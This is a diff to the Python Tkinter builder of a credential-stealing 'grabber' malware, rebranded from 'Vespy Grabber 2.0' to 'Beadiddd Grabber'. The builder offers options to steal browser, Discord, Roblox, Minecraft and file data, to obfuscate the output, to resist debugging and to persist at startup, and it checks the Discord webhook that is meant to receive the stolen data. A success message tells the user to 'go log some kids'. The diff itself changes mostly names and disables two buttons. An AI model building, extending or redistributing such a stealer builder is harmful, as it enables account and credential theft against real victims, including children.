@@ -10,7 +10,7 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 from tkinter.filedialog import askopenfilename
 
 window = Tk()
-window.title("Vespy Grabber 2.0 || @i_might_be_vesper")
+window.title("Beadiddd Grabber 2.0 || @nebeadidd#9992")
 window.geometry("744x447")
 window.maxsize(744, 447)
 window.minsize(744, 447)
@@ -36,10 +36,10 @@ compilebu = PhotoImage(file='assets/compile.png')
 class Builder:
     
     def __init__(self,browserR,discordR,robloxR,filesR,minecraftR,networkI,obfuscateS,webhookJ,antiD,rebootP,startupP,errorM,pingH,discordS,wbh,name,icon):
-        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+        webhook = DiscordWebhook(url=wbh, username="Beadiddd 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
         embed = DiscordEmbed(title=f"Grabber Compiled", description=f"Options Chose", color='4300d1')
         embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
-        embed.set_footer(text='Vespy 2.0 | by : vesper')
+        embed.set_footer(text='Beadiddd 2.0 | by : Beadiddd')
         embed.set_timestamp()
         self.FILE = open(f"{name}.py","w+")
         self.FILE.write(open("utils/Imports.py","r").read()+"\n")
@@ -153,7 +153,7 @@ main()
         self._Compile(icon = icon, name = name)
         webhook.add_embed(embed)
         webhook.execute()
-        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper","Grabber Successfully Compiled. Go log some kids now bitch")
+        messagebox.showinfo("Beadidd Grabber 2.0 || @nebeadidd#9992","Grabber Successfully Compiled. Go log some kids now bitch")
         Menu()
     
     def _webhooksJUNK(self, writed):
@@ -236,14 +236,14 @@ class Menu:
         self.setupBUTTON.place(x=58,y=244)
         self.compileBUTTON = Button(window, image=compilee,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._compile)
         self.compileBUTTON.place(x=58,y=311)
-        self.aboutBUTTON = Button(window, image=about,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._about)
+        self.aboutBUTTON = Button(window, image=about,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._about, state="disabled")
         self.aboutBUTTON.place(x=58,y=378)
         self._menu()
 
     def _menu(self):
         bg2 = Label(window, image=backg1,borderwidth=0)
         bg2.place(x=156, y=62)
-        tryz = Button(window, image=trybu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._vespyRAT)
+        tryz = Button(window, image=trybu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B")
         tryz.place(x=546,y=372)
     
     def _brsetup(self):
@@ -421,15 +421,15 @@ class Menu:
     def _testhook(self):
         wbh = self.webhook.get()
         try:
-            webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
-            embed = DiscordEmbed(title=f"Vespy Grabber", description=f"Webhook Working :white_check_mark:", color='4300d1')
-            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
-            embed.set_footer(text='Vespy 2.0 | by : vesper')
+            webhook = DiscordWebhook(url=wbh, username="Beadiddd 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
+            embed = DiscordEmbed(title=f"Beadiddd Grabber", description=f"Webhook Working :white_check_mark:", color='4300d1')
+            embed.set_author(name="author : Beadiddd", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
+            embed.set_footer(text='Beadiddd 2.0 | by : Beadiddd')
             embed.set_timestamp()
             webhook.add_embed(embed)
             webhook.execute()
         except:
-            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Invalid Webhook")
+            messagebox.showerror("Beadiddd Grabber 2.0 || @nebeadidd#9992","Invalid Webhook")
 
     def _phsetup(self):
         if self.pingH:
@@ -453,7 +453,7 @@ class Menu:
 
     def _verification(self):
         if len(self.webhook.get()) < 5:
-            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Webhook too short idiot")
+            messagebox.showerror("Beadiddd Grabber 2.0 || @nebeadidd#9992","Webhook too short idiot")
         else:
             try:
                 r=requests.get(self.webhook.get())
@@ -468,9 +468,9 @@ class Menu:
                     # :skull: ik
                     Builder(self.browserR,self.discordR,self.robloxR,self.filesR,self.minecraftR,self.networkI,self.obfuscateS,self.webhookJ,self.antiD,self.rebootP,self.startupP,self.errorM,self.pingH,self.discordS,webhook,name,icon)
                 else:
-                    messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Invalid Webhook")
+                    messagebox.showerror("Beadiddd Grabber 2.0 || @nebeadidd#9992","Invalid Webhook")
             except:
-                messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper","Invalid Webhook")
+                messagebox.showerror("Beadiddd Grabber 2.0 || @nebeadidd#9992","Invalid Webhook")
 
     def _compile(self):
         bg = Label(window, image=backg4, borderwidth=0)
@@ -505,7 +505,7 @@ class Menu:
 
     def _btc(self):
         copy("bc1qq3kuqn39h4uf2kr80230gqrj8k4gf9sx5ppzuf")
-        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper","BTC Address Copied, ty <3")
+        messagebox.showinfo("Beadiddd Grabber 2.0 || @nebeadidd#9992","BTC Address Copied, ty <3")
 
     def _about(self):
         bg = Label(window, image=backg2, borderwidth=0)
